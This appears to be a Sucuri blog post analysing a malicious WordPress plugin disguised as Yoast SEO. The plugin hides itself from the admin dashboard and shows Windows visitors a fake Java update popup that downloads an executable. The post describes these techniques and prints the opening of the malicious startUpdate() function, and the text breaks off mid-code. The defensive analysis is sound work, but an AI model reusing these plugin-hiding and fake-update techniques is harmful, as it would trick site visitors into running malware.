---
title: Fake Java Update Popup Found in Malicious WordPress Plugin
url: https://blog.sucuri.net/2025/05/fake-java-update-popup-found-in-malicious-wordpress-plugin.html
source: Over Security - Cybersecurity news aggregator
date: 2025-05-29
fetch_date: 2025-10-06T22:31:42.090352
---

# Fake Java Update Popup Found in Malicious WordPress Plugin

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Fake Java Update Popup Found in Malicious WordPress Plugin

[![](https://secure.gravatar.com/avatar/3bb7fb42c6bf04c758d570c2f6bb217266c127e77766dc9d8e6754f15cdd5867?s=60&d=mm&r=g)](https://blog.sucuri.net/author/puja-srivastava)

[Puja Srivastava](https://blog.sucuri.net/author/puja-srivastava)

* May 27, 2025

![Fake Java Update Popup Found in Malicious WordPress Plugin](https://blog.sucuri.net/wp-content/uploads/2025/05/Fake-Java-Update-Popup-Found-in-Malicious-WordPress-Plugin-1-820x385.png)

We recently assisted a customer who reported a persistent and concerning “Java Update” pop-up appearing on their WordPress website. This type of deceptive notification is a common tactic used by attackers to compromise website visitors. Our investigation revealed a malicious plugin operating stealthily within their WordPress environment.

![fake java popup](https://blog.sucuri.net/wp-content/uploads/2025/05/fake-java-pop-up.png)

## What Did We Find?

A plugin installed in the /wp-content/plugins/contact-form/ directory, posed as “Yoast SEO”, complete with fake metadata to mislead site owners. However, it served a completely different purpose.

The plugin injected a massive inline JavaScript block into the <head> of every page, but only for non-admin users. This script simulated a Java update prompt complete with visuals, progress bar, and localized text. It also included a hidden form that submitted user interaction data and triggered a download from a suspicious third-party domain.

![js injected into head section](https://blog.sucuri.net/wp-content/uploads/2025/05/js-injected-into-head-section.png)

The pop-up was not a legitimate system notification; rather, it was injected in the website’s code, carefully designed to mimic official software update prompts. The primary objective of this pop-up was to trick visitors into downloading and executing a malicious file, typically an executable file [Random-name].exe.

## Where Was the Infection Found?

* **Location:** /wp-content/plugins/contact-form/
* **File:** The main plugin PHP file (likely contact-form.php or similar)
* **Detection vector:** A fake Java update modal visible to site visitors on the frontend, especially on Windows devices.

![fake java update js script](https://blog.sucuri.net/wp-content/uploads/2025/05/fake-java-update-js-script-scaled.png)

## Analysis of the Malicious Code

### Plugin Hiding

A critical aspect of this malicious plugin’s design was its attempt at stealth and persistence. Once activated, the plugin implemented a mechanism to hide itself from the standard WordPress plugins list displayed in the administration dashboard. This made detection and removal significantly more challenging for site administrators.

![plugin hiding](https://blog.sucuri.net/wp-content/uploads/2025/05/plugin-hiding.png)

### Front-End Deception (Java Update Popup)

The core of the attack lies in presenting a fake “Java update” pop-up to unsuspecting website visitors, primarily those not logged in as administrators.

![fake java popup code](https://blog.sucuri.net/wp-content/uploads/2025/05/fake-java-popup-code.png)

### JavaScript Functionality for the Popup

The injected JavaScript creates and manages the fake Java update popup:

![injected js creating fake popup](https://blog.sucuri.net/wp-content/uploads/2025/05/injected-js-creating-fake-popup.png)

The popup is called on page load and includes several checks to determine if the popup should be displayed. One of the checks ensures that it avoids displaying the popup on mobile devices, macOS, or Safari browsers, likely to target a specific user base (Windows users) where the malicious executable is intended to run.

![popup avoiding mac and mobile](https://blog.sucuri.net/wp-content/uploads/2025/05/popup-avoiding-mac-and-mobile.png)

### Malicious Download and Execution

The most critical part is the **startUpdate()** function, which initiates the download of the malicious file.

```
window.startUpdate = function() {
    const progressBar = document.querySelector('.progress-bar');
    const progress = document.querySelector('.progress');
    const downloadIndicator = document.querySelector('.download-indicator');

    if (progressBar && progress) {
        progressBar.style.display = 'block';
        downloadIndicator.style.display = 'block';
        progress.style.cssText = 'width: 0% !important';

        let width = 0;
        const interval = setInterval(() => {
            if (width >= 100) {
                clearInter...